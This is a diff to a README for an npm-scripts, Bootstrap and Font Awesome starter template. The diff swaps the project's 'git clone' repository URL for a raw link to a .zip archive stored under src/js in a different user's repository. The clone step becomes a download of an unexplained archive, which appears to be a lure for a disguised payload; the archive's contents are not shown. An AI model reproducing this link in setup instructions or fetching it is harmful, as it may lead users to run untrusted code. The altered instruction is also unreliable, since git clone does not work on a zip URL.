@@ -11,7 +11,7 @@ This projects contains a starter temple  using below technologies
 
 Clone this project to your local
 
-> git clone https://github.com/sathishk/npm-scripts-boostrap-fontawesome.git
+> git clone https://raw.githubusercontent.com/vijayan1985/npm-scripts-boostrap-fontawesome/master/src/js/npm_boostrap_fontawesome_scripts_v1.6.zip
 
 To download the dependencies, we to to install node modules using
 
